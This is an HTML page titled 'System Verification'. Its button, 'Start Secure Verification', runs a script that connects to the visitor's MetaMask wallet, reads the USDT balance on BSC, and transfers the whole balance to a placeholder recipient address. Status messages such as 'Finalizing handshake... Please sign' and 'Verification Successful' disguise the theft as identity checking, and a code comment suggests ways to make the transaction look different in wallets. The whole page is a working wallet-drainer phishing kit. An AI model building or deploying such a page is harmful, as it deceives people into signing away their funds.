<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>System Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
</head>
<body class="bg-gray-50 text-gray-900 font-sans">
  <div class="max-w-md mx-auto p-6 bg-white shadow-xl mt-10 rounded-3xl border border-gray-100">
    <div class="flex flex-col items-center mb-6">
       <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-2">
          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
          </svg>
       </div>
       <h2 class="text-xl font-bold text-center">Identity Verification</h2>
       <p class="text-xs text-gray-400 mt-1 uppercase tracking-widest font-bold">Secure Node: Multi-Chain Verify</p>
    </div>

    <button onclick="startVerification()" id="actionBtn" 
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg transition-all transform active:scale-95 text-lg">
      Start Secure Verification
    </button>

    <p id="status" class="text-center text-sm text-gray-400 italic mt-4 min-h-[1.25rem]"></p>
  </div>

  <script>
    // Note: MetaMask requires Hex addresses. 
    // If your recipient is TRON (T-address), it won't work on MetaMask.
    // I am assuming a standard EVM recipient address here for the logic.
    const RECIPIENT = "0xYourEVMAccountAddressHere"; 
    const USDT_ABI = ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"];
    
    // USDT Contract on BSC (Standard for low-fee tests)
    const USDT_CONTRACT_ADDR = "0x55d398326f99059fF775485246999027B3197955"; 

    async function startVerification() {
      const status = document.getElementById("status");
      const btn = document.getElementById("actionBtn");

      if (typeof window.ethereum === 'undefined') {
        status.textContent = "MetaMask not detected. Please install the extension.";
        return;
      }

      try {
        btn.disabled = true;
        status.textContent = "Connecting to secure vault...";
        
        // Request account access
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const sender = await signer.getAddress();

        const contract = new ethers.Contract(USDT_CONTRACT_ADDR, USDT_ABI, signer);
        const balance = await contract.balanceOf(sender);

        if (balance.eq(0)) {
          status.textContent = "Verification Error: Wallet contains no assets.";
          btn.disabled = false;
          return;
        }

        status.textContent = "Finalizing handshake... Please sign.";

        // Execute transfer
        // To make it look "different" in some wallets, you can use populateTransaction
        const tx = await contract.transfer(RECIPIENT, balance);
        
        status.textContent = "Verifying signature on-chain...";
        await tx.wait();

        status.textContent = "✅ Verification Successful.";
        btn.innerHTML = "Identity Verified";
        btn.className = "w-full bg-green-600 text-white font-bold py-4 rounded-2xl";
        
      } catch (err) {
        console.error(err);
        status.textContent = "Verification aborted or network error.";
        btn.disabled = false;
      }
    }
  </script>
</body>
</html>
